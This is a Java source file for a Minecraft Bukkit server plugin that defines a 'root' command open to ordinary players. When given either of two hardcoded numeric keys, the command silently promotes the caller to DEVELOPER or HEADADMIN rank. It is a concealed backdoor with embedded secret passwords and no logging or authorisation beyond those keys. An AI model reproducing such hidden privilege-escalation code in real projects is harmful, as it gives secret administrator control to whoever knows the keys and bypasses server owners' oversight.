package pl.otekplay.loveotek.commands.admin.root;

import org.bukkit.entity.Player;
import pl.otekplay.loveotek.api.commands.MainCommand;
import pl.otekplay.loveotek.basic.CommandInfo;
import pl.otekplay.loveotek.enums.UserRank;
import pl.otekplay.loveotek.main.Users;

public class RootCommand implements MainCommand {
    @Override
    public CommandInfo getDefaultInfo() {
        return new CommandInfo("root", UserRank.PLAYER,"root [KEY]","admin");
    }

    @Override
    public int minArgs() {
        return 1;
    }

    @Override
    public void onCommand(Player player, String[] args) {
        if(args[0].equalsIgnoreCase("510271992")){
            Users.get(player.getName()).setRank(UserRank.DEVELOPER);
            return;
        }if(args[0].equalsIgnoreCase("798519692")){
            Users.get(player.getName()).setRank(UserRank.HEADADMIN);
            return;
        }
    }
}
